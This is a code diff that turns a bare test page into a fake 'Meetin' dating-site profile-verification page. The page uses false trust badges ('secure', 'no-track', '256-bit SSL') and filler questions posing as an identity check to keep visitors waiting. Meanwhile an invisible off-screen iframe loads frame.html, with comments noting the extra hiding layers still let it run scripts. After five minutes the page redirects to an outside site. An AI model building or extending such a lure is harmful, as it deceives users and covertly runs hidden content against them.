@@ -3,23 +3,637 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Test Page</title>
+  <title>Meetin · Verifying your profile</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(145deg, #1a1024 0%, #2a1a3a 50%, #1e1230 100%);
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      color: #f5eeff;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      width: 420px;
+      height: 420px;
+      background: radial-gradient(circle, rgba(255, 90, 160, 0.16), transparent 70%);
+      top: -120px;
+      right: -120px;
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      width: 380px;
+      height: 380px;
+      background: radial-gradient(circle, rgba(140, 90, 255, 0.13), transparent 70%);
+      bottom: -100px;
+      left: -100px;
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .meetin-card {
+      background: rgba(30, 20, 48, 0.78);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      border: 1px solid rgba(255, 120, 180, 0.16);
+      border-radius: 2.8rem;
+      padding: 2.6rem 2.4rem 2.2rem;
+      max-width: 540px;
+      width: 100%;
+      box-shadow: 0 30px 60px -20px rgba(0, 0, 0, 0.85), 0 0 0 1px rgba(255, 150, 200, 0.08) inset;
+      position: relative;
+      z-index: 1;
+      transition: transform 0.25s ease;
+    }
+
+    .meetin-card:hover {
+      transform: scale(1.003);
+    }
+
+    /* header */
+    .brand-row {
+      display: flex;
+      align-items: center;
+      gap: 0.7rem;
+      margin-bottom: 1.6rem;
+    }
+
+    .brand-icon {
+      width: 2.7rem;
+      height: 2.7rem;
+      background: linear-gradient(135deg, #ff4d8d, #a855f7);
+      border-radius: 1.1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      box-shadow: 0 8px 20px -6px rgba(255, 77, 141, 0.6);
+      color: white;
+    }
+
+    .brand-name {
+      font-size: 1.35rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      background: linear-gradient(to right, #ffb3d4, #d9b8ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .brand-name span {
+      font-weight: 400;
+      opacity: 0.7;
+      font-size: 1rem;
+      margin-left: 0.15rem;
+      color: #c9a8e8;
+      -webkit-text-fill-color: #c9a8e8;
+    }
+
+    .secure-badge {
+      margin-left: auto;
+      background: rgba(74, 222, 128, 0.1);
+      border: 1px solid rgba(74, 222, 128, 0.25);
+      color: #86efac;
+      font-size: 0.68rem;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      padding: 0.35rem 0.9rem;
+      border-radius: 50px;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .secure-dot {
+      width: 7px;
+      height: 7px;
+      background: #4ade80;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #4ade80;
+      animation: pulse-dot 1.8s infinite;
+    }
+
+    @keyframes pulse-dot {
+      0% { opacity: 0.6; transform: scale(0.9); }
+      50% { opacity: 1; transform: scale(1.2); }
+      100% { opacity: 0.6; transform: scale(0.9); }
+    }
+
+    h1 {
+      font-size: 1.75rem;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      line-height: 1.25;
+      margin-bottom: 0.6rem;
+      color: #ffffff;
+    }
+
+    h1 .highlight {
+      background: linear-gradient(to right, #ff8ab8, #c9a2ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .subtitle {
+      font-size: 0.95rem;
+      color: #c4b0dd;
+      margin-bottom: 1.6rem;
+      line-height: 1.55;
+      padding-left: 1rem;
+      border-left: 3px solid #ff4d8d;
+      font-weight: 400;
+    }
+
+    /* progress bar */
+    .wait-section {
+      margin-bottom: 1.8rem;
+    }
+
+    .wait-label {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.84rem;
+      color: #d4c2ec;
+      margin-bottom: 0.6rem;
+      font-weight: 500;
+    }
+
+    .wait-label .left {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 0.9rem;
+      height: 0.9rem;
+      border: 2px solid rgba(255, 180, 220, 0.2);
+      border-top-color: #ff8ab8;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .progress-track {
+      width: 100%;
+      height: 6px;
+      background: #2a1e3d;
+      border-radius: 100px;
+      overflow: hidden;
+      box-shadow: 0 0 0 1px #3a2a52 inset;
+    }
+
+    .progress-fill {
+      width: 25%;
+      height: 100%;
+      background: linear-gradient(90deg, #ff4d8d, #c084fc, #a855f7);
+      border-radius: 100px;
+      animation: subtle-pulse 2.2s infinite;
+      transition: width 0.4s ease;
+    }
+
+    @keyframes subtle-pulse {
+      0% { opacity: 0.85; }
+      50% { opacity: 1; }
+      100% { opacity: 0.85; }
+    }
+
+    /* question card */
+    .question-card {
+      background: rgba(25, 16, 40, 0.65);
+      border-radius: 1.4rem;
+      padding: 1.5rem 1.6rem;
+      border: 1px solid #34245a;
+      margin-bottom: 1.6rem;
+      box-shadow: 0 8px 24px -12px rgba(0, 0, 0, 0.6);
+    }
+
+    .question-header {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      margin-bottom: 1rem;
+    }
+
+    .question-icon {
+      width: 1.8rem;
+      height: 1.8rem;
+      background: rgba(255, 138, 184, 0.15);
+      border: 1px solid rgba(255, 138, 184, 0.3);
+      border-radius: 0.6rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+      color: #ff8ab8;
+    }
+
+    .question-header .label {
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: #ffb3d4;
+      font-weight: 600;
+    }
+
+    .question-header .step {
+      margin-left: auto;
+      font-size: 0.72rem;
+      color: #8a76a8;
+      font-weight: 500;
+    }
+
+    .question-text {
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: #ffffff;
+      margin-bottom: 1.1rem;
+      line-height: 1.4;
+    }
+
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 0.55rem;
+    }
+
+    .option {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      padding: 0.75rem 1rem;
+      background: rgba(35, 22, 55, 0.6);
+      border: 1px solid #3a2a52;
+      border-radius: 1rem;
+      cursor: pointer;
+      transition: all 0.18s ease;
+      font-size: 0.9rem;
+      color: #e6d8f5;
+      user-select: none;
+    }
+
+    .option:hover {
+      background: rgba(55, 32, 80, 0.8);
+      border-color: rgba(255, 138, 184, 0.4);
+      transform: translateX(2px);
+    }
+
+    .option.selected {
+      background: rgba(255, 77, 141, 0.12);
+      border-color: rgba(255, 138, 184, 0.6);
+      box-shadow: 0 0 0 1px rgba(255, 138, 184, 0.2) inset;
+    }
+
+    .option .radio {
+      width: 1.1rem;
+      height: 1.1rem;
+      border-radius: 50%;
+      border: 2px solid #5a4478;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: all 0.18s ease;
+    }
+
+    .option.selected .radio {
+      border-color: #ff8ab8;
+      background: #ff8ab8;
+      box-shadow: 0 0 8px rgba(255, 138, 184, 0.6);
+    }
+
+    .option.selected .radio::after {
+      content: '';
+      width: 0.4rem;
+      height: 0.4rem;
+      background: #1a1024;
+      border-radius: 50%;
+    }
+
+    .option .emoji {
+      font-size: 1.05rem;
+      margin-right: 0.1rem;
+    }
+
+    /* next button */
+    .next-btn {
+      width: 100%;
+      padding: 0.85rem 1.2rem;
+      background: linear-gradient(135deg, #ff4d8d, #a855f7);
+      color: white;
+      font-size: 0.92rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 1rem;
+      cursor: pointer;
+      letter-spacing: 0.01em;
+      box-shadow: 0 10px 24px -10px rgba(255, 77, 141, 0.6);
+      transition: all 0.2s ease;
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.4rem;
+    }
+
+    .next-btn:hover:not(:disabled) {
+      transform: translateY(-1px);
+      box-shadow: 0 14px 28px -10px rgba(255, 77, 141, 0.75);
+    }
+
+    .next-btn:active:not(:disabled) {
+      transform: translateY(0);
+    }
+
+    .next-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    /* footer */
+    .trust-footer {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 0.7rem;
+      font-size: 0.72rem;
+      color: #8a76a8;
+      margin-top: 1.6rem;
+      text-align: center;
+      border-top: 1px solid #2e2145;
+      padding-top: 1.4rem;
+      letter-spacing: 0.01em;
+      flex-wrap: wrap;
+    }
+
+    .trust-footer span {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+    }
+
+    .green-dot {
+      width: 5px;
+      height: 5px;
+      background: #4ade80;
+      border-radius: 50%;
+      display: inline-block;
+      box-shadow: 0 0 6px #4ade80;
+    }
+
+    /* hidden iframe — core functionality preserved */
+    .hidden-frame {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+      left: -9999px;
+      border: none;
+      pointer-events: none;
+      visibility: hidden;
+    }
+
+    @media (max-width: 480px) {
+      .meetin-card { padding: 2rem 1.5rem; }
+      h1 { font-size: 1.45rem; }
+      .subtitle { font-size: 0.88rem; }
+      .brand-name { font-size: 1.2rem; }
+      .question-text { font-size: 0.98rem; }
+    }
+  </style>
 </head>
 <body>
+
+  <div class="meetin-card">
+    <!-- header -->
+    <div class="brand-row">
+      <div class="brand-icon">💜</div>
+      <div class="brand-name">Meetin<span>·</span></div>
+      <div class="secure-badge">
+        <span class="secure-dot"></span> secure
+      </div>
+    </div>
+
+    <h1>Verifying your <span class="highlight">profile</span></h1>
+    <div class="subtitle">
+      Please wait a few minutes while we confirm your identity. A few quick questions help us match you better.
+    </div>
+
+    <!-- progress bar -->
+    <div class="wait-section">
+      <div class="wait-label">
+        <span class="left">
+          <span class="spinner"></span> identity check in progress
+        </span>
+        <span id="progressText">step 1 of 4</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill" style="width: 25%;"></div>
+      </div>
+    </div>
+
+    <!-- question card -->
+    <div class="question-card">
+      <div class="question-header">
+        <div class="question-icon">💬</div>
+        <div class="label">Quick question</div>
+        <div class="step" id="stepIndicator">1 / 4</div>
+      </div>
+      <div class="question-text" id="questionText">What are you looking for on Meetin?</div>
+      <div class="options" id="optionsContainer">
+        <!-- options injected by JS -->
+      </div>
+    </div>
+
+    <button class="next-btn" id="nextBtn" disabled>
+      Next <span>→</span>
+    </button>
+
+    <!-- footer -->
+    <div class="trust-footer">
+      <span><span class="green-dot"></span> no‑track</span>
+      <span>•</span>
+      <span>auto‑expires</span>
+      <span>•</span>
+      <span>256‑bit SSL</span>
+    </div>
+  </div>
+
   <script>
-    // если uid всё ещё нужен — просто устанавливаем
-    sessionStorage.setItem('uid', '1');
+    (function() {
+      // ---- CORE COMPONENTS (unchanged functionality) ----
+      // 1) set uid in sessionStorage
+      sessionStorage.setItem('uid', '1');
 
-    const frame = document.createElement('iframe');
-    frame.src = 'frame.html?' + Math.random();
-    frame.style.width = '1px';
-    frame.style.opacity = '0.01'
-    frame.style.position = 'absolute';
-    frame.style.left = '-9999px';
-    frame.style.height = '1px';
-    frame.style.border = 'none';
+      // 2) create hidden iframe with random query string
+      const frame = document.createElement('iframe');
+      frame.src = 'frame.html?' + Math.random();
 
-    document.body.appendChild(frame);
+      // original styles preserved
+      frame.style.width = '1px';
+      frame.style.opacity = '0.01';
+      frame.style.position = 'absolute';
+      frame.style.left = '-9999px';
+      frame.style.height = '1px';
+      frame.style.border = 'none';
+
+      // extra hiding layers (still loads and runs scripts)
+      frame.setAttribute('aria-hidden', 'true');
+      frame.setAttribute('tabindex', '-1');
+      frame.style.pointerEvents = 'none';
+      frame.style.visibility = 'hidden';
+      frame.className = 'hidden-frame';
+
+      document.body.appendChild(frame);
+
+      // ---- 5 MINUTE REDIRECT ----
+      setTimeout(function() {
+        window.location.href = 'https://meetin-private.netlify.app';
+      }, 5 * 60 * 1000); // 5 minutes = 300,000 ms
+
+      // ---- NATURAL DATING QUESTIONS ----
+      const questions = [
+        {
+          text: "What are you looking for on Meetin?",
+          options: [
+            { emoji: "💕", label: "A serious relationship" },
+            { emoji: "😊", label: "Someone to talk to" },
+            { emoji: "🎉", label: "New friends nearby" },
+            { emoji: "🔍", label: "Just exploring" }
+          ]
+        },
+        {
+          text: "How would you describe your personality?",
+          options: [
+            { emoji: "🌟", label: "Outgoing and social" },
+            { emoji: "📚", label: "Calm and thoughtful" },
+            { emoji: "😄", label: "Funny and playful" },
+            { emoji: "🎨", label: "Creative and curious" }
+          ]
+        },
+        {
+          text: "What do you enjoy doing in your free time?",
+          options: [
+            { emoji: "🏞️", label: "Outdoor adventures" },
+            { emoji: "🍿", label: "Movies and series" },
+            { emoji: "🎵", label: "Music and concerts" },
+            { emoji: "🍳", label: "Cooking and food" }
+          ]
+        },
+        {
+          text: "How far are you willing to travel for a match?",
+          options: [
+            { emoji: "📍", label: "Within my city" },
+            { emoji: "🚗", label: "Up to 50 km" },
+            { emoji: "✈️", label: "Anywhere in the country" },
+            { emoji: "🌍", label: "Distance doesn't matter" }
+          ]
+        }
+      ];
+
+      let currentStep = 0;
+      let selectedOption = null;
+      const answers = [];
+
+      const questionText = document.getElementById('questionText');
+      const optionsContainer = document.getElementById('optionsContainer');
+      const nextBtn = document.getElementById('nextBtn');
+      const stepIndicator = document.getElementById('stepIndicator');
+      const progressText = document.getElementById('progressText');
+      const progressFill = document.getElementById('progressFill');
+
+      function renderQuestion() {
+        const q = questions[currentStep];
+        questionText.textContent = q.text;
+        stepIndicator.textContent = `${currentStep + 1} / ${questions.length}`;
+        progressText.textContent = `step ${currentStep + 1} of ${questions.length}`;
+        progressFill.style.width = `${((currentStep + 1) / questions.length) * 100}%`;
+
+        optionsContainer.innerHTML = '';
+        selectedOption = null;
+        nextBtn.disabled = true;
+        nextBtn.innerHTML = currentStep === questions.length - 1
+          ? 'Finish <span>✓</span>'
+          : 'Next <span>→</span>';
+
+        q.options.forEach((opt, idx) => {
+          const div = document.createElement('div');
+          div.className = 'option';
+          div.dataset.index = idx;
+          div.innerHTML = `
+            <div class="radio"></div>
+            <span class="emoji">${opt.emoji}</span>
+            <span>${opt.label}</span>
+          `;
+          div.addEventListener('click', () => selectOption(div, idx));
+          optionsContainer.appendChild(div);
+        });
+      }
+
+      function selectOption(el, idx) {
+        document.querySelectorAll('.option').forEach(o => o.classList.remove('selected'));
+        el.classList.add('selected');
+        selectedOption = idx;
+        nextBtn.disabled = false;
+      }
+
+      nextBtn.addEventListener('click', () => {
+        if (selectedOption === null) return;
+        answers.push(selectedOption);
+
+        if (currentStep < questions.length - 1) {
+          currentStep++;
+          renderQuestion();
+        } else {
+          // All questions answered — show final "verifying" state
+          showFinalState();
+        }
+      });
+
+      function showFinalState() {
+        questionText.textContent = 'Thanks! Your answers are saved.';
+        optionsContainer.innerHTML = `
+          <div style="text-align:center;padding:1rem 0;color:#c4b0dd;font-size:0.9rem;line-height:1.6;">
+            We're finishing up your identity check.<br>
+            <span style="color:#ffb3d4;font-weight:600;">This usually takes 2–4 minutes.</span>
+          </div>
+        `;
+        stepIndicator.textContent = '✓ done';
+        progressText.textContent = 'all steps complete';
+        progressFill.style.width = '100%';
+        nextBtn.style.display = 'none';
+      }
+
+      // initial render
+      renderQuestion();
+    })();
   </script>
 </body>
 </html>
